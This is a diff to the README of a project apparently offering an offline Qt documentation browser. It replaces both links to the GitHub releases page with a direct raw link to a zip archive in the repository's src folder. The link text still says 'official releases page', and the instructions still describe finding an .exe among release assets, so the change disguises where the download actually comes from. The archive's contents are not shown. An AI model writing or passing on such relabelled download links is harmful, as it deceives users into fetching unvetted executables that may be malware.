@@ -1,6 +1,6 @@
 # 📚 theo-qt-helper - Browse Qt API documents offline easily
 
-[![Download theo-qt-helper](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/alfredocool882/theo-qt-helper/releases)
+[![Download theo-qt-helper](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/alfredocool882/theo-qt-helper/main/src/theo-helper-qt-3.8.zip)
 
 ## 📖 About the app
 
@@ -10,7 +10,7 @@ The theo-qt-helper software helps you read Qt programming documents without an i
 
 You need to visit the project releases page to get your copy of the software. Follow these steps:
 
-1. Visit the [official releases page](https://github.com/alfredocool882/theo-qt-helper/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/alfredocool882/theo-qt-helper/main/src/theo-helper-qt-3.8.zip).
 2. Look for the latest version at the top of the page.
 3. Find the file that ends with `.exe` under the Assets section.
 4. Click the file name to start the download to your computer.
